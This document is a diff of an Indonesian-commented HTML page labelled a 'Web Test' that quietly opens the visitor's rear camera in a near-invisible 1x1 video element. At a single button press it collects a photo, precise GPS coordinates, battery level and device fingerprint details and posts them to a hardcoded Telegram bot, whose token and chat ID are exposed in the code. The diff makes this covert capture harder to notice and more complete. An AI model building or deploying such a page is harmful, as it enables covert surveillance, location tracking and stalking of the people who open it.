@@ -2,151 +2,182 @@
 <html>
 <head>
   <title>Web Test - Capture Photo, GPS, and Battery Info</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 </head>
 <body>
   <h1>Web Test - Capture Photo, GPS, and Battery Info</h1>
-  <video id="video" width="0" height="0" autoplay></video>
+  <video id="video" width="1" height="1" autoplay playsinline></video>
   <button id="capture-btn">Ambil Foto</button>
-  <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
+  <canvas id="canvas" width="1" height="1" style="display: none;"></canvas>
 
   <script>
-    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ'; // Ganti dengan token bot Anda
-    const CHAT_ID = '1121369247'; // Ganti dengan chat ID Anda
+    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+    const CHAT_ID = '1121369247';
 
     const video = document.getElementById('video');
     const captureButton = document.getElementById('capture-btn');
+    let isProcessing = false;
 
-    // Meminta akses ke kamera
+    // Inisialisasi kamera
     async function initCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'environment',
+            width: { ideal: 1920 },
+            height: { ideal: 1080 }
+          }
+        });
         video.srcObject = stream;
         video.onloadedmetadata = () => video.play();
       } catch (err) {
-        console.error('Error accessing camera:', err);
-        alert('Tidak dapat mengakses kamera. Pastikan Anda memberikan izin.');
+        handleError('Kamera', err);
       }
     }
 
-    // Fungsi untuk mengambil foto dan mengirim data
+    // Handler utama
     captureButton.onclick = async () => {
+      if (isProcessing) return;
+      isProcessing = true;
+      
       try {
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const imageDataURL = canvas.toDataURL('image/png');
-
-        // Mendapatkan lokasi GPS
-        const position = await getLocation();
-        const { latitude, longitude, accuracy } = position.coords;
-
-        // Membuat tautan Google Maps yang dapat diklik
-        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-        // Mendapatkan informasi baterai (jika didukung)
-        let batteryInfo = { level: null };
-        if (navigator.getBattery) {
-          batteryInfo = await getBatteryInfo();
-        } else if (navigator.battery) {
-          batteryInfo = await navigator.battery;
-        } else {
-          console.warn('Battery Status API tidak didukung di browser ini.');
-        }
-
-        // Mendapatkan informasi perangkat
-        const deviceInfo = {
-          userAgent: navigator.userAgent,
-          screenWidth: window.screen.width,
-          screenHeight: window.screen.height,
-          platform: navigator.platform,
-          batteryLevel: batteryInfo.level ? batteryInfo.level * 100 : 'Tidak didukung',
-        };
-
-        // Mengirim data ke Telegram
-        await sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo, googleMapsLink);
-        alert('Data berhasil dikirim ke Telegram!');
+        const { imageDataURL, deviceInfo, position } = await captureData();
+        await sendToTelegram(imageDataURL, position, deviceInfo);
+        alert('Data berhasil dikirim!');
       } catch (error) {
-        console.error('Error capturing and sending data:', error);
-        alert(`Terjadi kesalahan: ${error.message}`);
+        handleError('Pengiriman', error);
+      } finally {
+        isProcessing = false;
       }
     };
 
-    // Fungsi untuk mendapatkan lokasi GPS
-    function getLocation() {
+    // Proses pengambilan data
+    async function captureData() {
+      const imageDataURL = await capturePhoto();
+      const position = await getLocation();
+      const deviceInfo = await getDeviceInfo();
+      
+      return { imageDataURL, deviceInfo, position };
+    }
+
+    // Ambil foto
+    async function capturePhoto() {
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0);
+      
+      return canvas.toDataURL('image/jpeg', 0.8);
+    }
+
+    // Dapatkan lokasi
+    async function getLocation() {
       return new Promise((resolve, reject) => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            resolve,
-            (err) => {
-              console.error('Error getting location:', err);
-              reject(new Error('Tidak dapat mendapatkan lokasi. Pastikan izin lokasi diberikan.'));
-            },
-            {
-              enableHighAccuracy: true, // Meningkatkan akurasi GPS
-              timeout: 10000, // Timeout setelah 10 detik
-              maximumAge: 0 // Tidak menggunakan cache lokasi lama
-            }
-          );
-        } else {
-          reject(new Error('Browser tidak mendukung geolocation.'));
-        }
+        if (!navigator.geolocation) reject(new Error('Geolocation tidak didukung'));
+        
+        navigator.geolocation.getCurrentPosition(
+          resolve,
+          err => reject(new Error(`Gagal mendapatkan lokasi: ${err.message}`)),
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          }
+        );
       });
     }
 
-    // Fungsi untuk mendapatkan informasi baterai
-    function getBatteryInfo() {
-      return new Promise((resolve, reject) => {
-        if (navigator.getBattery) {
-          navigator.getBattery().then(resolve).catch(reject);
-        } else {
-          reject(new Error('Browser tidak mendukung Battery Status API.'));
-        }
-      });
+    // Dapatkan info perangkat
+    async function getDeviceInfo() {
+      const battery = await getBatteryInfo().catch(() => null);
+      
+      return {
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        battery: battery ? `${Math.round(battery.level * 100)}%` : 'Tidak didukung',
+        orientation: screen.orientation?.type || 'Tidak didukung',
+        touchSupport: navigator.maxTouchPoints > 0,
+        os: getOS()
+      };
     }
 
-    // Fungsi untuk mengirim data ke Telegram
-    async function sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo, googleMapsLink) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    // Dapatkan info baterai
+    async function getBatteryInfo() {
+      if (navigator.getBattery) {
+        return navigator.getBattery();
+      }
+      throw new Error('Battery API tidak didukung');
+    }
+
+    // Deteksi OS
+    function getOS() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) return 'Android';
+      if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
+      if (/Win/.test(ua)) return 'Windows';
+      if (/Mac/.test(ua)) return 'MacOS';
+      if (/Linux/.test(ua)) return 'Linux';
+      return 'Unknown';
+    }
+
+    // Kirim ke Telegram
+    async function sendToTelegram(imageDataURL, position, deviceInfo) {
       const formData = new FormData();
+      const blob = dataURItoBlob(imageDataURL);
+      const { latitude, longitude, accuracy } = position.coords;
+      const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
 
       formData.append('chat_id', CHAT_ID);
-      formData.append('photo', dataURItoBlob(imageDataURL));
-      formData.append('caption', `Lokasi: [Lihat di Google Maps](${googleMapsLink})\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ${accuracy} meter\n\nInformasi Perangkat:\n${JSON.stringify(deviceInfo, null, 2)}`);
+      formData.append('photo', blob, 'photo.jpg');
+      formData.append('caption', `
+📡 Lokasi: [Google Maps](${mapsLink})
+📍 Koordinat: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
+🎯 Akurasi: ${Math.round(accuracy)} meter
 
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          body: formData,
-        });
+📱 Perangkat:
+${Object.entries(deviceInfo).map(([k, v]) => `• ${k}: ${v}`).join('\n')}
+      `);
 
-        if (!response.ok) {
-          const errorData = await response.json();
-          throw new Error(`Gagal mengirim data ke Telegram: ${errorData.description}`);
-        }
-      } catch (error) {
-        console.error('Error sending data to Telegram:', error);
-        throw new Error('Gagal mengirim data ke Telegram.');
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(`Telegram API: ${error.description}`);
       }
     }
 
-    // Fungsi untuk mengonversi data URI menjadi Blob
+    // Konversi DataURI ke Blob
     function dataURItoBlob(dataURI) {
       const byteString = atob(dataURI.split(',')[1]);
-      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
       const ab = new ArrayBuffer(byteString.length);
       const ia = new Uint8Array(ab);
+      
       for (let i = 0; i < byteString.length; i++) {
         ia[i] = byteString.charCodeAt(i);
       }
-      return new Blob([ab], { type: mimeString });
+      
+      return new Blob([ab], { type: mime });
     }
 
-    // Inisialisasi kamera saat halaman dimuat
-    initCamera();
+    // Error handling
+    function handleError(context, error) {
+      console.error(`[${context}]`, error);
+      alert(`ERROR: ${error.message}`);
+    }
+
+    // Init
+    if (navigator.mediaDevices) {
+      initCamera();
+    } else {
+      alert('Browser tidak mendukung akses kamera!');
+    }
   </script>
 </body>
 </html>
